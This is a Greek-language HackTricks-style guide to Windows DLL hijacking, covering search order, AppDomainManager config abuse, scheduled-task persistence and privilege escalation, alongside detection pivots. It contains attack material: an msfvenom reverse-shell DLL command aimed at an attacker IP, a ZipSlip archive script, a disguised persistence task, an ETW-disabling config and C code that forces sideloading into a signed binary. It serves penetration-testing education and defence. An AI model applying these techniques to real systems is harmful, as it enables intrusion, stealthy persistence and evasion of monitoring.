# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας έμπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος περιλαμβάνει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση εδώ στο escalation, η μέθοδος του hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking, καθεμία από τις οποίες έχει διαφορετική αποτελεσματικότητα ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying ώστε να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το search pattern της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για φόρτωση από την εφαρμογή, η οποία θεωρεί ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως τα `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθύνεται στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη, μαζί με την αντιγραμμένη εφαρμογή, με τρόπο που θυμίζει τεχνικές Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να κάνετε μια έμπιστη διεργασία **.NET Framework** να φορτώσει κώδικα του attacker. Αν το εκτελέσιμο-στόχος είναι μια **managed** εφαρμογή, το CLR συμβουλεύεται επίσης ένα αρχείο configuration εφαρμογής με όνομα που βασίζεται στο εκτελέσιμο (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν το config δείχνει σε ένα assembly που ελέγχεται από τον attacker και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη διαδρομή κώδικα της εφαρμογής** και το εκτελεί μέσα στην έμπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το configuration schema του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο τα `<appDomainManagerAssembly>` όσο και τα `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Ελάχιστος διαχειριστής:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Πρακτικές σημειώσεις:
- Πρόκειται για tradecraft ειδικά για το **.NET Framework**. Βασίζεται στην ανάλυση ρυθμίσεων του CLR και όχι στη σειρά αναζήτησης DLL του Win32.
- Το host πρέπει να είναι πραγματικά ένα **managed EXE**. Γρήγορο triage: `sigcheck -m target.exe`, `corflags target.exe` ή έλεγχος για το **CLR Runtime Header** στα PE metadata.
- Το όνομα του config file πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries**, επειδή το trusted EXE παραμένει ανέγγιχτο, ενώ το malicious managed assembly εκτελείται in-process.
- Αν έχετε ήδη έναν writable installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **first stage**, ακολουθούμενο από classic DLL sideloading ή reflective loading για τα επόμενα stages.

### AppDomainManager ως downloader + bootstrap scheduled-task

Ένα πρακτικό intrusion pattern είναι ο συνδυασμός του trusted managed EXE με ένα malicious `*.config` και ένα malicious AppDomainManager DLL, το οποίο λειτουργεί μόνο ως **small bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί ένα signed .NET installer ή updater από μια αξιόπιστη τοποθεσία, όπως `%USERPROFILE%\Downloads`.
2. Το adjacent config προκαλεί το CLR να φορτώσει το attacker assembly **πριν** ξεκινήσει η legitimate app logic.
3. Ο malicious manager εκτελεί ένα **path gate** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει στο second stage να εκτελεστεί μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το πραγματικό payload σε μια user-writable path, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το signed host EXE παραμένει αμετάβλητο, επομένως το triage που ελέγχει μόνο τα hashes του main binary μπορεί να μην εντοπίσει το compromise.
- Το απλό **path-based anti-analysis** είναι συνηθισμένο: η μετακίνηση του ZIP/EXE/DLL triad σε Desktop, Temp ή sandbox path μπορεί σκόπιμα να διακόψει την αλυσίδα.
- Το first-stage AppDomainManager DLL μπορεί να παραμείνει μικρό και low-noise, ενώ το πραγματικό implant γίνεται fetch αργότερα.

Minimal persistence example που συναντάται συχνά με αυτό το pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` σημαίνει **highest available** για τον συγκεκριμένο user/session· δεν αποτελεί από μόνο του εγγυημένη κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική συχνά κατηγοριοποιείται καλύτερα ως **execution/persistence μέσω .NET config abuse** παρά ως κλασικό missing-DLL search-order hijacking, παρότι οι operators συχνά συνδυάζουν και τα δύο.

Detection pivots:
- Signed .NET executables που εκκινούνται από **ZIP extraction paths**, `Downloads`, `%TEMP%` ή άλλους user-writable φακέλους, μαζί με ένα **colocated** `<exe>.config`.
- Νέα scheduled tasks των οποίων το action δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και των οποίων τα names μιμούνται browser/vendor updaters.
- Short-lived managed bootstrap processes που κάνουν αμέσως download ενός άλλου EXE και στη συνέχεια εκκινούν το `schtasks.exe`.
- Samples που τερματίζουν νωρίς, εκτός αν το executable path αντιστοιχεί σε αναμενόμενο user-profile directory.

### Hijacking ενός existing scheduled task για relaunch του sideload chain

Για persistence, μην αναζητάτε μόνο **creating a new task**. Ορισμένα intrusion sets περιμένουν μέχρι ένας legitimate installer να δημιουργήσει ένα **normal updater task** και έπειτα να κάνουν **rewrite το task action**, ώστε το υπάρχον name, author και trigger να παραμένουν οικεία στους defenders.

Reusable workflow:
1. Εγκαταστήστε/εκκινήστε το legitimate software και εντοπίστε το task που δημιουργεί κανονικά.
2. Κάντε export το task XML και σημειώστε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο το action, ώστε το task να εκκινεί το **trusted host EXE** σας από έναν user-writable staging directory, το οποίο στη συνέχεια κάνει side-load ή AppDomain-load το πραγματικό payload.
4. Κάντε re-register το ίδιο task name αντί να δημιουργήσετε ένα νέο προφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealthy:
- Το όνομα του task μπορεί να εξακολουθεί να φαίνεται νόμιμο (για παράδειγμα, ένας updater προμηθευτή).
- Το **Task Scheduler service** το εκκινεί, επομένως η επικύρωση parent/ancestor συχνά βλέπει την αναμενόμενη αλυσίδα scheduling αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα task** μπορεί να παραβλέψουν ένα task του οποίου η registration υπήρχε ήδη, αλλά το action του δείχνει πλέον σε `%LOCALAPPDATA%`, `%APPDATA%` ή άλλη διαδρομή που ελέγχεται από τον attacker.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε το XML του `C:\Windows\System32\Tasks\*` και τα metadata του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με ένα baseline.
- Δημιουργήστε alert όταν ένα **updater task που μοιάζει να ανήκει σε vendor** εκτελείται από **directories εγγράψιμα από τον user** ή εκκινεί ένα .NET EXE με colocated αρχείο `*.config`.

> [!TIP]
> Για μια step-by-step αλυσίδα που συνδυάζει HTML staging, AES-CTR configs και .NET implants πάνω από DLL sideloading, δείτε το παρακάτω workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εντοπισμός DLL που λείπουν

Ο πιο συνηθισμένος τρόπος για να εντοπίσετε DLL που λείπουν μέσα σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από το sysinternals, **ορίζοντας** τα **ακόλουθα 2 filters**:

![Common Techniques - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος για να εντοπίσετε DLL που λείπουν μέσα σε ένα σύστημα είναι να εκτελέσετε το procmon από το sysinternals, ορίζοντας τα ακόλουθα 2 filters](<../../../images/image (961).png>)

![Common Techniques - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος για να εντοπίσετε DLL που λείπουν μέσα σε ένα σύστημα είναι να εκτελέσετε το procmon από το sysinternals, ορίζοντας τα ακόλουθα 2 filters](<../../../images/image (230).png>)

και να εμφανίσετε μόνο το **File System Activity**:

![Common Techniques - Εντοπισμός DLL που λείπουν: και να εμφανίσετε μόνο το File System Activity](<../../../images/image (153).png>)

Αν αναζητάτε **DLL που λείπουν γενικά**, **αφήστε** αυτή τη διαδικασία να εκτελείται για μερικά **seconds**.\
Αν αναζητάτε μια **DLL που λείπει μέσα σε ένα συγκεκριμένο executable**, ορίστε ένα ακόμη filter, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή events.<sup>[[9]](#references)</sup>

## Εκμετάλλευση DLL που λείπουν

Για να κάνετε privilege escalation, αναζητήστε μια **DLL που ένα privileged process προσπαθεί να φορτώσει** από μια τοποθεσία στην οποία μπορείτε να γράψετε. Αυτό μπορεί να συμβεί όταν ελέγχετε ένα directory που αναζητείται πριν από το directory που περιέχει τη legitimate DLL ή όταν η ζητούμενη DLL δεν υπάρχει και μπορείτε να γράψετε σε ένα από τα directories που αναζητούνται.

### Dll Search Order

**Μέσα στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε τον τρόπο με τον οποίο φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** αναζητούν DLLs ακολουθώντας ένα σύνολο **pre-defined search paths**, σύμφωνα με μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν μια harmful DLL τοποθετείται στρατηγικά σε ένα από αυτά τα directories, ώστε να φορτωθεί πριν από την authentic DLL. Μια λύση για την αποτροπή αυτού είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε** **32-bit** συστήματα παρακάτω:

1. Το directory από το οποίο φορτώθηκε η εφαρμογή.
2. Το system directory. Χρησιμοποιήστε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε τη διαδρομή αυτού του directory.(_C:\Windows\System32_)
3. Το 16-bit system directory. Δεν υπάρχει συνάρτηση που να επιστρέφει τη διαδρομή αυτού του directory, αλλά αυτό αναζητείται. (_C:\Windows\System_)
4. Το Windows directory. Χρησιμοποιήστε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε τη διαδρομή αυτού του directory.
1. (_C:\Windows_)
5. Το current directory.
6. Τα directories που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει το per-application path που καθορίζεται από το registry key **App Paths**. Το key **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό του DLL search path.

Αυτή είναι η **default** search order με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, το current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη δυνατότητα, δημιουργήστε το registry value **SafeDllSearchMode** στο **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\ και ορίστε το σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από το directory του executable module που φορτώνει το **LoadLibraryEx**.

Τέλος, μια DLL μπορεί να φορτωθεί με absolute path αντί για name. Σε αυτή την περίπτωση, τα Windows αναζητούν τη συγκεκριμένη DLL μόνο σε αυτό το path· οι dependencies που ζητούνται με name εξακολουθούν να ακολουθούν την applicable search order.

Υπάρχουν και άλλοι τρόποι τροποποίησης της search order, αλλά δεν θα τους εξηγήσω εδώ.

### Αλυσίδωση arbitrary file write σε missing-DLL hijack

1. Χρησιμοποιήστε filters του **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε τα ονόματα DLL που το process αναζητά αλλά δεν βρίσκει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται μέσω **schedule/service**, η τοποθέτηση μιας DLL με ένα από αυτά τα ονόματα στο **application directory** (search-order entry #1) θα έχει ως αποτέλεσμα να φορτωθεί στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, το process αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σας είναι ένα **arbitrary write τύπου ZipSlip**, δημιουργήστε ένα ZIP του οποίου το entry διαφεύγει από το extraction dir, ώστε η DLL να καταλήξει στον φάκελο της εφαρμογής:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο monitored inbox/share· όταν το scheduled task επανεκκινήσει τη διεργασία, αυτή φορτώνει το malicious DLL και εκτελεί τον κώδικά σας ως service account.

### Εξαναγκασμός sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας advanced τρόπος για να επηρεάσετε deterministically το DLL search path μιας newly created διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τα native APIs του ntdll. Παρέχοντας εδώ έναν attacker-controlled κατάλογο, μια target διεργασία που κάνει resolve ένα imported DLL με βάση το όνομά του (χωρίς absolute path και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει ένα malicious DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις process parameters με το RtlCreateProcessParametersEx και παρέχετε ένα custom DllPath που δείχνει στον controlled φάκελό σας (π.χ. στον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το target binary κάνει resolve ένα DLL με βάση το όνομά του, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά το resolution, επιτρέποντας reliable sideloading ακόμη και όταν το malicious DLL δεν βρίσκεται στον ίδιο κατάλογο με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την current διεργασία.
- Το target πρέπει να κάνει import ή LoadLibrary ενός DLL με βάση το όνομά του (χωρίς absolute path και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να γίνουν hijack. Τα forwarded exports και το SxS ενδέχεται να αλλάξουν την precedence.

Minimal C example (ntdll, wide strings, απλοποιημένο error handling):

<details>
<summary>Πλήρες C example: εξαναγκασμός DLL sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα operational χρήσης
- Τοποθετήστε ένα malicious xmllite.dll (που κάνει export τις απαιτούμενες functions ή λειτουργεί ως proxy προς την πραγματική) στον κατάλογο DllPath.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll βάσει ονόματος χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και εκτελεί sideload του DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να χρησιμοποιείται για τη δημιουργία multi-stage sideloading chains: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με custom DllPath, ώστε να εξαναγκάσει τη φόρτωση του DLL του attacker από έναν staging directory.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking μέσω `.exe.config`

Για targets **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`** χωρίς patching μνήμης, μέσω κατάχρησης του adjacent **`.exe.config`** file της εφαρμογής. Αντί να βασίζεται αποκλειστικά στο Win32 DLL search order, ο attacker τοποθετεί ένα legitimate .NET EXE δίπλα σε ένα malicious config και ένα ή περισσότερα assemblies που ελέγχει ο attacker.

Πώς λειτουργεί το chain:<sup>[[15]](#references)[[22]](#references)</sup>
1. Το host EXE ξεκινά και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να δημιουργήσει ένα `AppDomainManager` που ελέγχεται από τον attacker.
3. Ο malicious manager αποκτά **pre-`Main()` execution** μέσα στη trusted host process.
4. Το ίδιο config μπορεί να εξαναγκάσει το CLR να επιλύει πρώτα local assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και μπορεί να αποδυναμώσει το runtime validation/telemetry χωρίς inline patching.

Pattern τύπου campaign (η ακριβής εμφώλευση μπορεί να διαφέρει ανά directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Γιατί αυτό είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση των assemblies στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε κώδικα του attacker κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η λογική της legitimate εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή full-trust να φορτώσει unsigned ή tampered assemblies χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποφεύγει τις ανακατευθύνσεις publisher-policy προς νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** κάνει την επιλογή runtime πιο deterministic.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από το configuration, αντί το implant να κάνει patch το `EtwEventWrite` στη μνήμη.

Operational pattern που έχει παρατηρηθεί σε πρόσφατες campaigns:
- Το Stage 1 ρίχνει τα `setup.exe`, `setup.exe.config` και local assemblies.
- Το Stage 2 τα αντιγράφει σε έναν πειστικό φάκελο **AppData update**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω **scheduled task**.
- Το Stage 3 επαληθεύει το execution context, για παράδειγμα ότι ο αναμενόμενος parent είναι ο `svchost.exe` από το Task Scheduler, πριν φορτώσει το final RAT DLL/export.

Ιδέες για hunting:
- Signed ή κατά τα άλλα legitimate **.NET executables** που εκτελούνται μαζί με ύποπτα γειτονικά αρχεία **`.config`** σε user-writable locations.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Scheduled tasks που επανεκκινούν renamed update binaries από το **`%LOCALAPPDATA%`** ή από app-specific καταλόγους `\bin\update\`.
- Parent/child chains όπου ένα scheduled task εκκινεί ένα trusted .NET host που φορτώνει αμέσως non-vendor assemblies από τον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης dll σύμφωνα με την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις από την τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν εντοπίζεται ένα **DLL που έχει το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνηθισμένη αναζήτηση. Αντί γι’ αυτό, ελέγχει πρώτα για redirection και manifest, πριν χρησιμοποιήσει το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Όταν το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί την έκδοση του known DLL, μαζί με οποιαδήποτε dependent DLLs, **παραλείποντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτά τα known DLLs.
- Όταν ένα **DLL έχει dependencies**, η αναζήτηση για αυτά τα dependent DLLs πραγματοποιείται σαν να είχαν καθοριστεί μόνο από τα **module names** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω full path.

### Κλιμάκωση Privileges

**Απαιτήσεις**:

- Εντοπίστε μια process που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά privileges** (horizontal ή lateral movement) και από την οποία **λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **directory** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο directory του executable ή ένας directory μέσα στο system path.

Αυτές οι προϋποθέσεις δεν είναι συνήθως διαθέσιμες by default: τα privileged executables συνήθως δεν έχουν missing DLL dependencies και οι standard users κανονικά δεν μπορούν να γράψουν σε system search-path directories. Misconfigured περιβάλλοντα μπορούν παρ’ όλα αυτά να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το project [UACME](https://github.com/hfiref0x/UACME). Παρότι ο κύριος στόχος του είναι το UAC bypass, περιέχει DLL-hijacking PoCs για συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον writable directory που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα permissions σε έναν φάκελο** εκτελώντας:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **abuse το DLL Hijacking για escalation προνομίων** με permissions εγγραφής σε έναν **System Path φάκελο**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)θα ελέγξει αν έχετε permissions εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα automated tools για την ανακάλυψη αυτού του vulnerability είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

